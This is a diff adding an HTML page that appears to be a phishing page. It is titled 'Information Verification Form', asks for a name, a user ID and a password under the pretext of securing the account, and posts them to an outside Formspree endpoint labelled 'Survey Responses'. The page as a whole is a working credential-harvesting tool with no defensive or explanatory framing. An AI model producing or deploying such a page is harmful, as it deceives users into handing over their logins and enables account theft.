@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" Content="IE=edge">
+    <meta charset="utf-8">
+    <title>Information Verification Form</title>
+    <link rel="shortcut icon" href="/assets/favicon.ico">
+    
+</head>
+<body>
+
+<h1 class="form__title">Information Verification Form</h1>
+<form id="fs-frm" name="Information Verification Form" accept-charset="utf-8" action="https://formspree.io/f/xqkoendo" method="post">
+  <fieldset id="fs-frm-inputs">
+    <label for="full-name">Full Name</label><br>
+    <input type="text" name="name" id="full-name" placeholder="First and Last" required=""><br>
+    <label for="email-address">User ID</label><br>
+    <input type="email" name="_replyto" id="email-address" placeholder="User ID" required=""><br>
+    <label for="Password">Password</label><br>
+    <input type="password" name="Password"autofocus placeholder="Password" required=""><br>
+    <fieldset id="fs-frm-selects">
+      <label for="timely">Do you want Secure your account?</label><br>
+      <select name="quality" id="quality" required=""><br>
+        <option value="" selected="" disabled="">Choose</option>
+        <option value="Yes">Yes</option>
+        <option value="No">No</option>
+        <option value="May be">Not this time</option>
+      </select>
+    </fieldset>
+    <label for="message">Additional Comments</label><br>
+    <textarea rows="3" name="message" id="message" placeholder="text" ></textarea>
+    <input type="hidden" name="_subject" id="email-subject" value="Survey Responses">
+  </fieldset>
+  <input type="submit" value="Send Responses">
+</form>
